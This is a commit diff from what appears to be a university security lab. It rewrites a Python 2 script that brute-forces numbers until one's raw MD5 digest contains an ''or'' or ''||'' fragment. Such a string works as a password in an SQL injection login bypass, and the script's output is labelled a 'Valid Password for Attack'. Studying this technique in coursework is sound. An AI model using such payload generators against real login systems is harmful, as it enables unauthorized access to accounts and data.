c67ec6a9c84372f8e17293858625673dc52fbefa
Saif Mahmud Dhrubo <saif.dhrubo@gmail.com>
2019-04-12 18:03:46 +0600

    Lab - 8 Complete

--- Lab_8/6.1.3.py
+++ Lab_8/6.1.3.py
@@ -1,50 +1,46 @@
-from concurrent.futures import ThreadPoolExecutor
-import concurrent
-import hashlib
+from hashlib import md5
+import os
 
-# reference: http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
-step = 100000
-def get_md5_str(input_str):
-    m = hashlib.md5()
-    m.update(input_str)
-    return m.digest()
 
-def check_valid(hash_val):
-    or_idx = hash_val.find("'||'")
-    if or_idx == -1:
-        or_idx = hash_val.find("'or'")
-        if or_idx == -1:
-            return False
-    return hash_val[or_idx+4].isdigit()
+def check_md5_str(md5_str):
 
-def process(i):
-    for idx in range(i, i+step):
-        val = str(idx)
-        hash_val = get_md5_str(val)
-        if check_valid(hash_val):
-            return idx
-    
+    pos1 = md5_str.find("'||'")
+    pos2 = md5_str.lower().find("'or'")
 
-if __name__ == '__main__':
-    curr = 129581926211651571912466741651878684928
-    leap =  5*10**7
-    stop = False
-    with ThreadPoolExecutor() as executor:
-        while True:
-            print curr
-            futures = [executor.submit(process, i) for i in range(curr, curr+leap, step)]
-            curr+= leap
-            print len(futures)
-            for future in concurrent.futures.as_completed(futures):
-                #print 'completed future'
-                try:
-                    res= future.result()
-                    if res is not None:
-                        print 'RESULT: '
-                        print res
-			stop = True
-                except:
-                    print 'EXCEPTION'
-            if stop:
-                break
+    if pos1 >= 0 and (pos1 + 4) < len(md5_str) and md5_str[pos1 + 4].isdigit():
+        if int(md5_str[pos1 + 4]) > 0:
+            print 'MD5 Digest :', md5_str
+            return True
 
+    if pos2 >= 0 and (pos2 + 4) < len(md5_str) and md5_str[pos2 + 4].isdigit():
+        if int(md5_str[pos2 + 4]) > 0:
+            print 'MD5 Digest :', md5_str
+            return True
+
+    return False
+
+
+found = False
+
+while not found:
+
+    random_str = os.urandom(16).encode('hex')
+    i = int(random_str, 16)
+    print "New Random Password :", i
+
+    while True:
+        attack_str = str(i)
+        md5_str = md5(attack_str).digest()
+
+        #print 'MD5 Digest :', md5_str
+
+        i = i + 1
+
+        if (i % 100000000) == 0:
+            break
+
+        if check_md5_str(md5_str):
+            found = True
+            break
+
+print "Valid Password for Attack :", attack_str
